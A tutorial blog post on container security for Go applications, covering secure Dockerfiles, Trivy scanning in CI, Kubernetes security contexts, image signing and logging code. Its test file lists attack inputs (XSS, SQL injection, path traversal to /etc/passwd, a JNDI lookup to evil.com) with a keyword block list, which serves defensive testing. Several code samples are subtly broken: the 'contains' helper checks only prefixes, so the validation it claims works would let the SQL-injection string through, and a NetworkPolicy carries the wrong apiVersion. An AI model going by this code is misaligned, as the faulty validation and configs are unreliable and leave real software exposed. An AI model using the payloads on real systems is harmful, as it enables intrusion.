---
title: "Container Security Scanning and Hardening for Go Applications"
date: 2025-10-18T16:44:52+03:00
tags: [ "docker", "golang", "scanning", "security"]
categories: [ "SecOps", "Programming"]
description: "Implement security scanning, vulnerability management, and hardening for Go container images."
series: "Security Operations"
---

Container security has become a critical concern as organizations increasingly adopt containerized applications. With the rise of microservices and cloud-native architectures, Go applications running in containers face numerous security challenges, from vulnerable base images to misconfigurations that can expose sensitive data or provide attack vectors.

This comprehensive guide explores how to implement robust security scanning, vulnerability management, and hardening strategies specifically tailored for Go applications. We'll cover everything from choosing secure base images to implementing runtime security monitoring, ensuring your containerized Go applications maintain the highest security standards throughout their lifecycle.

## Why Container Security Matters for Go Applications

While Go is designed with security in mind, containerized Go applications inherit security risks from their runtime environment. These risks include:

- **Vulnerable dependencies** in base images and system packages
- **Misconfigurations** that expose unnecessary attack surfaces
- **Privilege escalation** opportunities through improper user management
- **Network exposure** through unnecessary ports and services
- **Runtime vulnerabilities** that can be exploited during execution

The impact of security breaches in containerized environments can be severe, potentially leading to data exfiltration, service disruption, and lateral movement within your infrastructure.

## Prerequisites

Before diving into container security for Go applications, you should have:

- **Intermediate Go programming experience**
- **Basic Docker knowledge** (creating Dockerfiles, building images)
- **Understanding of Linux fundamentals** (users, permissions, file systems)
- **Familiarity with CI/CD concepts**
- **Basic knowledge of security principles**

Required tools for following along:
- Docker Desktop or Docker Engine
- Go 1.19+ installed
- Access to a container registry
- Basic text editor or IDE

## Building Secure Go Container Images

### Choosing the Right Base Image

The foundation of container security starts with selecting an appropriate base image. For Go applications, you have several options, each with different security implications:

```dockerfile
# Option 1: Distroless (Recommended for production)
FROM gcr.io/distroless/static-debian11:latest
COPY myapp /
ENTRYPOINT ["/myapp"]

# Option 2: Alpine Linux (Minimal attack surface)
FROM alpine:3.18
RUN apk --no-cache add ca-certificates
WORKDIR /root/
COPY myapp .
CMD ["./myapp"]

# Option 3: Scratch (Absolute minimal)
FROM scratch
COPY ca-certificates.crt /etc/ssl/certs/
COPY myapp /
ENTRYPOINT ["/myapp"]
```

**Distroless images** are Google's contribution to container security, containing only your application and its runtime dependencies without package managers, shells, or other programs that attackers might exploit.

### Multi-Stage Dockerfile for Security

Here's a production-ready, security-focused Dockerfile for a Go application:

```dockerfile
# Build stage
FROM golang:1.21-alpine AS builder

# Install git and ca-certificates (needed for go modules and HTTPS)
RUN apk add --no-cache git ca-certificates tzdata

# Create appuser for running the application
RUN adduser -D -g '' appuser

# Set working directory
WORKDIR /build

# Copy go mod files first (better caching)
COPY go.mod go.sum ./
RUN go mod download

# Verify dependencies
RUN go mod verify

# Copy source code
COPY . .

# Build the application with security flags
RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build \
    -ldflags='-w -s -extldflags "-static"' \
    -a -installsuffix cgo \
    -o app ./cmd/server

# Final stage - distroless
FROM gcr.io/distroless/static-debian11:latest

# Copy timezone data
COPY --from=builder /usr/share/zoneinfo /usr/share/zoneinfo

# Copy SSL certificates
COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/

# Copy user information
COPY --from=builder /etc/passwd /etc/passwd

# Copy the binary
COPY --from=builder /build/app /app

# Use non-root user
USER appuser

# Expose port (document only, doesn't actually expose)
EXPOSE 8080

# Health check
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
    CMD ["/app", "-health-check"]

# Set entrypoint
ENTRYPOINT ["/app"]
```

### Implementing Health Checks in Go

A robust health check implementation helps with both security and reliability:

```go
package main

import (
    "context"
    "flag"
    "fmt"
    "log"
    "net/http"
    "os"
    "os/signal"
    "syscall"
    "time"
)

type Server struct {
    httpServer *http.Server
}

func main() {
    healthCheck := flag.Bool("health-check", false, "Run health check")
    flag.Parse()

    if *healthCheck {
        performHealthCheck()
        return
    }

    server := &Server{}
    server.setupRoutes()
    server.start()
}

func (s *Server) setupRoutes() {
    mux := http.NewServeMux()
    
    // Health check endpoint
    mux.HandleFunc("/health", s.healthHandler)
    
    // Ready check endpoint
    mux.HandleFunc("/ready", s.readyHandler)
    
    // Main application routes
    mux.HandleFunc("/api/v1/users", s.usersHandler)
    
    s.httpServer = &http.Server{
        Addr:         ":8080",
        Handler:      mux,
        ReadTimeout:  15 * time.Second,
        WriteTimeout: 15 * time.Second,
        IdleTimeout:  60 * time.Second,
    }
}

func (s *Server) start() {
    // Graceful shutdown handling
    stop := make(chan os.Signal, 1)
    signal.Notify(stop, os.Interrupt, syscall.SIGTERM)

    go func() {
        log.Println("Server starting on :8080")
        if err := s.httpServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
            log.Fatalf("Server failed to start: %v", err)
        }
    }()

    <-stop
    log.Println("Shutting down server...")

    ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
    defer cancel()

    if err := s.httpServer.Shutdown(ctx); err != nil {
        log.Fatalf("Server forced to shutdown: %v", err)
    }

    log.Println("Server stopped")
}

func (s *Server) healthHandler(w http.ResponseWriter, r *http.Request) {
    // Perform basic health checks
    if err := s.checkDependencies(); err != nil {
        http.Error(w, "Health check failed", http.StatusServiceUnavailable)
        return
    }
    
    w.WriteHeader(http.StatusOK)
    fmt.Fprintf(w, "OK")
}

func (s *Server) readyHandler(w http.ResponseWriter, r *http.Request) {
    // More comprehensive readiness checks
    if err := s.checkDependencies(); err != nil {
        http.Error(w, "Not ready", http.StatusServiceUnavailable)
        return
    }
    
    w.WriteHeader(http.StatusOK)
    fmt.Fprintf(w, "Ready")
}

func (s *Server) usersHandler(w http.ResponseWriter, r *http.Request) {
    // Implement your API logic here
    w.WriteHeader(http.StatusOK)
    fmt.Fprintf(w, "Users endpoint")
}

func (s *Server) checkDependencies() error {
    // Check database connectivity, external services, etc.
    // Return error if any critical dependency is unavailable
    return nil
}

func performHealthCheck() {
    client := &http.Client{
        Timeout: 3 * time.Second,
    }
    
    resp, err := client.Get("http://localhost:8080/health")
    if err != nil {
        log.Printf("Health check failed: %v", err)
        os.Exit(1)
    }
    defer resp.Body.Close()
    
    if resp.StatusCode != http.StatusOK {
        log.Printf("Health check returned status: %d", resp.StatusCode)
        os.Exit(1)
    }
    
    log.Println("Health check passed")
    os.Exit(0)
}
```

## Container Vulnerability Scanning

### Integrating Trivy for Comprehensive Scanning

Trivy is one of the most comprehensive vulnerability scanners for containers. Here's how to integrate it into your workflow:

```bash
#!/bin/bash
# scan-image.sh - Comprehensive container scanning script

set -e

IMAGE_NAME=${1:-"myapp:latest"}
SEVERITY_THRESHOLD=${2:-"HIGH,CRITICAL"}
OUTPUT_FORMAT=${3:-"table"}

echo "Scanning image: $IMAGE_NAME"

# Scan for OS vulnerabilities
echo "=== OS Package Vulnerabilities ==="
trivy image --severity $SEVERITY_THRESHOLD --format $OUTPUT_FORMAT $IMAGE_NAME

# Scan for application dependencies
echo "=== Application Dependencies ==="
trivy image --severity $SEVERITY_THRESHOLD --format $OUTPUT_FORMAT --vuln-type library $IMAGE_NAME

# Generate detailed report
echo "=== Generating detailed report ==="
trivy image --format json --output scan-report.json $IMAGE_NAME

# Check for secrets
echo "=== Secret Detection ==="
trivy image --scanners secret $IMAGE_NAME

# Configuration scanning
echo "=== Configuration Issues ==="
trivy image --scanners config $IMAGE_NAME

# Exit with error if critical vulnerabilities found
CRITICAL_COUNT=$(trivy image --format json $IMAGE_NAME | jq '.Results[]?.Vulnerabilities[]? | select(.Severity=="CRITICAL") | length' | wc -l)

if [ "$CRITICAL_COUNT" -gt 0 ]; then
    echo "ERROR: Found $CRITICAL_COUNT critical vulnerabilities"
    exit 1
fi

echo "Security scan completed successfully"
```

### Automated Scanning in CI/CD

Here's a GitHub Actions workflow that implements security scanning:

```yaml
# .github/workflows/security-scan.yml
name: Container Security Scan

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
    
    - name: Set up Go
      uses: actions/setup-go@v4
      with:
        go-version: '1.21'
    
    - name: Run security checks on Go code
      run: |
        # Install gosec
        go install github.com/securecodewarrior/gosec/v2/cmd/gosec@latest
        
        # Run gosec
        gosec -fmt json -out gosec-report.json -stdout ./...
    
    - name: Build Docker image
      run: |
        docker build -t myapp:${{ github.sha }} .
    
    - name: Run Trivy vulnerability scanner
      uses: aquasecurity/trivy-action@master
      with:
        image-ref: 'myapp:${{ github.sha }}'
        format: 'sarif'
        output: 'trivy-results.sarif'
    
    - name: Upload Trivy scan results
      uses: github/codeql-action/upload-sarif@v2
      with:
        sarif_file: 'trivy-results.sarif'
    
    - name: Check for critical vulnerabilities
      run: |
        # Fail the build if critical vulnerabilities are found
        CRITICAL=$(docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
          aquasec/trivy image --severity CRITICAL --format json myapp:${{ github.sha }} | \
          jq '.Results[]?.Vulnerabilities[]? | select(.Severity=="CRITICAL") | length' | wc -l)
        
        if [ "$CRITICAL" -gt 0 ]; then
          echo "Critical vulnerabilities found: $CRITICAL"
          exit 1
        fi
```

### Go Code Security Scanning

Implement static analysis security testing (SAST) for your Go code:

```go
// security_test.go - Security-focused testing
package main

import (
    "crypto/rand"
    "crypto/subtle"
    "encoding/hex"
    "testing"
    "time"
)

// TestSecureRandomGeneration ensures cryptographically secure random generation
func TestSecureRandomGeneration(t *testing.T) {
    // Generate secure random bytes
    bytes := make([]byte, 32)
    _, err := rand.Read(bytes)
    if err != nil {
        t.Fatalf("Failed to generate secure random bytes: %v", err)
    }
    
    // Verify randomness (basic check)
    zeroCount := 0
    for _, b := range bytes {
        if b == 0 {
            zeroCount++
        }
    }
    
    // If more than half the bytes are zero, something's wrong
    if zeroCount > len(bytes)/2 {
        t.Error("Generated bytes appear to have poor randomness")
    }
}

// TestConstantTimeComparison ensures timing attack resistance
func TestConstantTimeComparison(t *testing.T) {
    secret := "super-secret-key"
    
    tests := []struct {
        name     string
        input    string
        expected bool
    }{
        {"correct", "super-secret-key", true},
        {"incorrect", "wrong-key", false},
        {"partial", "super-secret", false},
    }
    
    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            // Use constant time comparison
            result := subtle.ConstantTimeCompare([]byte(secret), []byte(tt.input)) == 1
            if result != tt.expected {
                t.Errorf("Expected %v, got %v", tt.expected, result)
            }
        })
    }
}

// TestInputValidation ensures proper input sanitization
func TestInputValidation(t *testing.T) {
    maliciousInputs := []string{
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
    }
    
    for _, input := range maliciousInputs {
        t.Run("malicious_input", func(t *testing.T) {
            if !isValidInput(input) {
                t.Logf("Correctly rejected malicious input: %s", input)
            } else {
                t.Errorf("Failed to reject malicious input: %s", input)
            }
        })
    }
}

// isValidInput - Example input validation function
func isValidInput(input string) bool {
    // Implement your validation logic
    // This is a simplified example
    dangerous := []string{"<script>", "DROP TABLE", "..", "${jndi:"}
    
    for _, pattern := range dangerous {
        if contains(input, pattern) {
            return false
        }
    }
    return true
}

func contains(s, substr string) bool {
    return len(s) >= len(substr) && s[:len(substr)] == substr
}
```

## Container Hardening Strategies

### Runtime Security Configuration

Implement comprehensive runtime security through proper container configuration:

```yaml
# docker-compose.security.yml - Production security configuration
version: '3.8'

services:
  myapp:
    image: myapp:latest
    
    # Security configurations
    security_opt:
      - no-new-privileges:true  # Prevent privilege escalation
      - apparmor:docker-default # Enable AppArmor
    
    # Run as non-root user
    user: "1000:1000"
    
    # Read-only root filesystem
    read_only: true
    
    # Temporary directories for runtime needs
    tmpfs:
      - /tmp
      - /var/tmp
    
    # Resource limits
    deploy:
      resources:
        limits:
          cpus: '1'
          memory: 512M
        reservations:
          cpus: '0.5'
          memory: 256M
    
    # Capabilities - drop all, add only needed
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    
    # Disable privileged mode
    privileged: false
    
    # Network settings
    networks:
      - app-network
    
    # Health check
    healthcheck:
      test: ["CMD", "/app", "-health-check"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 40s

networks:
  app-network:
    driver: bridge
```

This configuration enforces multiple security layers:

- **no-new-privileges:true** prevents the container from gaining additional privileges through setuid/setgid bits
- **Non-root execution** runs the application as user ID `1000:1000` instead of root
- **Read-only filesystem** prevents unauthorized filesystem modifications
- **Capability restrictions** drops all capabilities and adds only `NET_BIND_SERVICE`
- **Resource limits** enforce CPU and memory boundaries
- **Network isolation** through dedicated bridge network
- **Health checks** provide continuous monitoring

## Runtime Security Monitoring

### Implementing Container Escape Detection

Detecting unusual container behavior requires runtime monitoring and auditing:

```go
// runtime_monitor.go - Container security monitoring
package main

import (
    "fmt"
    "log"
    "os"
    "runtime"
    "sync"
    "syscall"
    "time"
)

// SecurityMonitor tracks container security metrics
type SecurityMonitor struct {
    mu                sync.RWMutex
    processCount      int
    openFileCount     int
    networkConnections int
    syscallErrors     int
    lastCheck         time.Time
}

func NewSecurityMonitor() *SecurityMonitor {
    return &SecurityMonitor{
        lastCheck: time.Now(),
    }
}

// Monitor runs continuous security monitoring
func (sm *SecurityMonitor) Monitor(ctx <-chan struct{}, interval time.Duration) {
    ticker := time.NewTicker(interval)
    defer ticker.Stop()

    for {
        select {
        case <-ctx:
            return
        case <-ticker.C:
            sm.CheckSecurityStatus()
        }
    }
}

// CheckSecurityStatus performs comprehensive security checks
func (sm *SecurityMonitor) CheckSecurityStatus() {
    sm.mu.Lock()
    defer sm.mu.Unlock()

    sm.lastCheck = time.Now()

    // Check process count
    sm.checkProcessCount()

    // Check open files
    sm.checkOpenFiles()

    // Check memory usage
    sm.checkMemoryStatus()

    // Check syscall errors
    sm.checkSyscallErrors()

    // Log metrics
    sm.logMetrics()
}

func (sm *SecurityMonitor) checkProcessCount() {
    // Check for unusual process spawning
    // This is a simplified example
    pidPath := "/proc/self/stat"
    _, err := os.Stat(pidPath)
    if err != nil {
        sm.syscallErrors++
    }
}

func (sm *SecurityMonitor) checkOpenFiles() {
    // Check file descriptor limits
    var limit syscall.Rlimit
    err := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &limit)
    if err != nil {
        sm.syscallErrors++
        log.Printf("Error checking file limits: %v", err)
        return
    }

    // Get current open files count
    fdDir := "/proc/self/fd"
    dir, err := os.Open(fdDir)
    if err != nil {
        log.Printf("Error opening fd directory: %v", err)
        return
    }
    defer dir.Close()

    entries, err := dir.Readdirnames(-1)
    if err != nil {
        log.Printf("Error reading fd directory: %v", err)
        return
    }

    sm.openFileCount = len(entries)

    // Alert if file descriptors exceed threshold
    if uint64(sm.openFileCount) > limit.Cur*90/100 {
        log.Printf("WARNING: Open file descriptors near limit: %d/%d", 
                   sm.openFileCount, limit.Cur)
    }
}

func (sm *SecurityMonitor) checkMemoryStatus() {
    var m runtime.MemStats
    runtime.ReadMemStats(&m)

    // Check for memory leaks
    if m.HeapAlloc > 500*1024*1024 { // Alert at 500MB
        log.Printf("WARNING: High heap allocation: %v MB", 
                   m.HeapAlloc/1024/1024)
    }

    // Monitor garbage collection
    log.Printf("GC count: %v, GC pause: %v ms",
               m.NumGC, float64(m.PauseNs[(m.NumGC+255)%256])/1e6)
}

func (sm *SecurityMonitor) checkSyscallErrors() {
    // In production, track syscall errors from your application
    // This is a placeholder for actual syscall error tracking
}

func (sm *SecurityMonitor) logMetrics() {
    sm.mu.RLock()
    defer sm.mu.RUnlock()

    log.Printf("Security Metrics - Open Files: %d, Syscall Errors: %d, "+
               "Check Time: %v",
               sm.openFileCount, sm.syscallErrors, sm.lastCheck)
}

// GetMetrics returns current security metrics
func (sm *SecurityMonitor) GetMetrics() map[string]int {
    sm.mu.RLock()
    defer sm.mu.RUnlock()

    return map[string]int{
        "open_files":      sm.openFileCount,
        "syscall_errors":  sm.syscallErrors,
        "process_count":   sm.processCount,
    }
}
```

### Kubernetes Security Context Configuration

For Kubernetes deployments, implement comprehensive security policies:

```yaml
# k8s-deployment-security.yaml - Kubernetes security configuration
apiVersion: v1
kind: ServiceAccount
metadata:
  name: myapp
  namespace: default

---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: myapp-role
  namespace: default
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  verbs: ["get", "list"]

---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: myapp-rolebinding
  namespace: default
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: myapp-role
subjects:
- kind: ServiceAccount
  name: myapp
  namespace: default

---
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: myapp-pdb
spec:
  minAvailable: 1
  selector:
    matchLabels:
      app: myapp

---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
  namespace: default
spec:
  replicas: 3
  selector:
    matchLabels:
      app: myapp
  template:
    metadata:
      labels:
        app: myapp
      annotations:
        container.apparmor.security.beta.kubernetes.io/myapp: localhost/docker-default
        seccomp.security.alpha.kubernetes.io/pod: localhost/default
    spec:
      serviceAccountName: myapp
      
      # Pod security context
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        runAsGroup: 1000
        fsGroup: 1000
        seccompProfile:
          type: RuntimeDefault
      
      # DNS policy for security
      dnsPolicy: ClusterFirst
      
      containers:
      - name: myapp
        image: myapp:latest
        imagePullPolicy: Always
        
        # Container security context
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          runAsNonRoot: true
          runAsUser: 1000
          runAsGroup: 1000
          capabilities:
            drop:
            - ALL
            add:
            - NET_BIND_SERVICE
        
        # Resource limits
        resources:
          requests:
            cpu: 100m
            memory: 128Mi
          limits:
            cpu: 500m
            memory: 512Mi
        
        # Port configuration
        ports:
        - name: http
          containerPort: 8080
          protocol: TCP
        
        # Liveness probe
        livenessProbe:
          httpGet:
            path: /health
            port: 8080
          initialDelaySeconds: 30
          periodSeconds: 10
          timeoutSeconds: 5
          failureThreshold: 3
        
        # Readiness probe
        readinessProbe:
          httpGet:
            path: /ready
            port: 8080
          initialDelaySeconds: 5
          periodSeconds: 5
          timeoutSeconds: 3
          failureThreshold: 3
        
        # Startup probe for slow-starting applications
        startupProbe:
          httpGet:
            path: /health
            port: 8080
          initialDelaySeconds: 0
          periodSeconds: 10
          timeoutSeconds: 3
          failureThreshold: 30
        
        # Volume mounts
        volumeMounts:
        - name: tmp
          mountPath: /tmp
        - name: cache
          mountPath: /var/cache
        
        # Environment variables
        env:
        - name: ENVIRONMENT
          value: "production"
        - name: LOG_LEVEL
          value: "info"
        - name: GOMAXPROCS
          valueFrom:
            resourceFieldRef:
              containerName: myapp
              resource: limits.cpu
      
      # Security policies
      affinity:
        podAntiAffinity:
          preferredDuringSchedulingIgnoredDuringExecution:
          - weight: 100
            podAffinityTerm:
              labelSelector:
                matchExpressions:
                - key: app
                  operator: In
                  values:
                  - myapp
              topologyKey: kubernetes.io/hostname
      
      # Volumes
      volumes:
      - name: tmp
        emptyDir: {}
      - name: cache
        emptyDir: {}

---
apiVersion: policy/v1
kind: NetworkPolicy
metadata:
  name: myapp-network-policy
spec:
  podSelector:
    matchLabels:
      app: myapp
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: ingress-nginx
    ports:
    - protocol: TCP
      port: 8080
  egress:
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: TCP
      port: 53
    - protocol: UDP
      port: 53
  - to:
    - podSelector:
        matchLabels:
          app: database
    ports:
    - protocol: TCP
      port: 5432
```

## Container Supply Chain Security

### Image Signing and Verification

Implement cryptographic verification of container images:

```bash
#!/bin/bash
# sign-and-verify-image.sh - Container image signing

set -e

IMAGE_NAME="myapp:latest"
REGISTRY="docker.io"
KEY_PATH="$HOME/.docker/keys/signing_key"

echo "=== Signing Container Image ==="

# Sign the image with cosign
cosign sign --key $KEY_PATH ${REGISTRY}/${IMAGE_NAME}

echo "Image signed successfully"

echo "=== Verifying Image Signature ==="

# Verify the signature
cosign verify --key ${KEY_PATH}.pub ${REGISTRY}/${IMAGE_NAME}

echo "Image signature verified successfully"

echo "=== Generating SBOM (Software Bill of Materials) ==="

# Generate SBOM using syft
syft ${REGISTRY}/${IMAGE_NAME} -o cyclonedx > sbom-cyclonedx.xml
syft ${REGISTRY}/${IMAGE_NAME} -o spdx > sbom-spdx.json

echo "SBOM generated successfully"

echo "=== Scanning SBOM for Vulnerabilities ==="

# Scan SBOM with grype
grype sbom:sbom-cyclonedx.xml --fail-on high

echo "Supply chain security checks completed"
```

### Dependency Management Best Practices

Implement secure dependency management practices:

```go
// dependency_checker.go - Verify and audit Go dependencies
package main

import (
    "encoding/json"
    "fmt"
    "log"
    "os/exec"
    "strings"
)

type Dependency struct {
    Name    string
    Version string
    Hash    string
    Direct  bool
}

// AuditDependencies runs Go mod audit
func AuditDependencies() error {
    cmd := exec.Command("go", "list", "-json", "-m", "all")
    output, err := cmd.Output()
    if err != nil {
        return fmt.Errorf("failed to list modules: %v", err)
    }

    // Parse dependencies
    var deps []Dependency
    decoder := json.NewDecoder(strings.NewReader(string(output)))
    
    for decoder.More() {
        var dep map[string]interface{}
        if err := decoder.Decode(&dep); err != nil {
            return fmt.Errorf("failed to decode dependency: %v", err)
        }
        
        deps = append(deps, Dependency{
            Name:    dep["Path"].(string),
            Version: dep["Version"].(string),
            Direct:  dep["Direct"].(bool),
        })
    }

    // Check for known vulnerabilities
    log.Printf("Found %d dependencies\n", len(deps))
    
    // Run govulncheck
    vulnCmd := exec.Command("govulncheck", "./...")
    vulnOutput, err := vulnCmd.Output()
    if err != nil {
        log.Printf("Vulnerability check failed: %v", err)
        return fmt.Errorf("vulnerabilities detected: %s", string(vulnOutput))
    }

    log.Println("All dependencies passed vulnerability check")
    return nil
}
```

## Monitoring and Incident Response

### Security Logging Best Practices

Implement comprehensive security logging in your Go application:

```go
// security_logging.go - Security-focused logging
package main

import (
    "fmt"
    "log"
    "net/http"
    "time"
)

type SecurityLogger struct {
    logger *log.Logger
}

// LogSecurityEvent logs security-relevant events
func (sl *SecurityLogger) LogSecurityEvent(event string, details map[string]interface{}) {
    timestamp := time.Now().UTC().Format(time.RFC3339)
    
    logEntry := fmt.Sprintf(
        "[%s] SECURITY_EVENT: %s | Details: %v",
        timestamp,
        event,
        details,
    )
    
    sl.logger.Println(logEntry)
}

// LogUnauthorizedAccess logs authentication failures
func (sl *SecurityLogger) LogUnauthorizedAccess(r *http.Request, reason string) {
    sl.LogSecurityEvent("UNAUTHORIZED_ACCESS", map[string]interface{}{
        "remote_ip":  r.RemoteAddr,
        "path":       r.URL.Path,
        "method":     r.Method,
        "user_agent": r.UserAgent(),
        "reason":     reason,
    })
}

// LogConfigurationChange logs security configuration changes
func (sl *SecurityLogger) LogConfigurationChange(item string, oldValue, newValue interface{}) {
    sl.LogSecurityEvent("CONFIGURATION_CHANGE", map[string]interface{}{
        "item":       item,
        "old_value":  oldValue,
        "new_value":  newValue,
        "timestamp":  time.Now().UTC(),
    })
}

// LogSecretAccess logs access to sensitive data
func (sl *SecurityLogger) LogSecretAccess(secretName string, accessor string) {
    sl.LogSecurityEvent("SECRET_ACCESS", map[string]interface{}{
        "secret":   secretName,
        "accessor": accessor,
        "time":     time.Now().UTC(),
    })
}
```

## Conclusion

Container security for Go applications requires a multi-layered approach combining secure image construction, comprehensive vulnerability scanning, runtime security enforcement, and continuous monitoring. The journey toward secure containerized Go applications involves understanding security throughout the entire lifecycle – from development through production deployment.

**Secure base images** form the foundation of container security. Choosing minimal, regularly-updated base images like distroless significantly reduces your attack surface compared to full Linux distributions. Multi-stage builds ensure that development tools and source code never make it into production images.

**Vulnerability scanning** must be integrated throughout your development pipeline. Tools like Trivy, Grype, and Snyk provide comprehensive coverage of OS packages, application dependencies, and configuration issues. Automated scanning in CI/CD prevents vulnerable images from reaching production while establishing security baselines for your applications.

**Runtime security hardening** through proper Docker and Kubernetes configurations creates defense-in-depth protection. Running containers with minimal privileges, read-only filesystems, capability restrictions, and network policies significantly limits the impact of potential compromises. These configurations should be standard practice, not exceptions.

**Supply chain security** ensures that the images you deploy haven't been tampered with and contain only known, verified dependencies. Image signing, SBOM generation, and regular vulnerability audits of your dependency trees protect against both accidental inclusion of vulnerable packages and malicious tampering.

**Continuous monitoring and logging** provide visibility into container behavior and enable rapid detection of security incidents. Implementing security logging, runtime monitoring, and alert mechanisms ensures that anomalous container behavior is quickly identified and investigated.

**Compliance and audit requirements** make security documentation and evidence of security practices increasingly important. Maintaining security scanning reports, signed images, and audit logs demonstrates your commitment to security and helps meet regulatory requirements.

The techniques and practices covered in this article – from Dockerfile best practices to Kubernetes security contexts – provide a comprehensive toolkit for securing Go applications in containers. Start by implementing the foundational practices: secure base images, multi-stage builds, and vulnerability scanning. Progress to runtime security hardening and monitoring once you have these basics in place.

Container security is not a destination but an ongoing journey. As threats evolve and new vulnerabilities are discovered, your security practices must evolve as well. Regular security assessments, keeping scanning tools updated, and staying informed about container security best practices ensure that your Go applications remain secure throughout their lifecycle.

## Additional Resources

- [OWASP Container Security Top 10](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html) - Container security best practices
- [Trivy Documentation](https://aquasecurity.github.io/trivy/) - Comprehensive container scanning tool
- [Docker Security Best Practices](https://docs.docker.com/engine/security/) - Official Docker security documentation
- [Kubernetes Security Documentation](https://kubernetes.io/docs/concepts/security/) - Kubernetes security features and configurations
- [Cosign Image Signing](https://docs.sigstore.dev/cosign/overview/) - Container image signing and verification
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker/) - Security configuration benchmarks
- [NIST Container Security Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf) - Comprehensive container security guidance
- [Go Security Best Practices](https://golang.org/doc/effective_go#security) - Official Go security guidelines
- [Kubernetes Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/) - Pod security standards and policies
- [Container Runtime Security](https://kubernetes.io/docs/tasks/run-application/pod-exec/) - Runtime security practices and monitoring
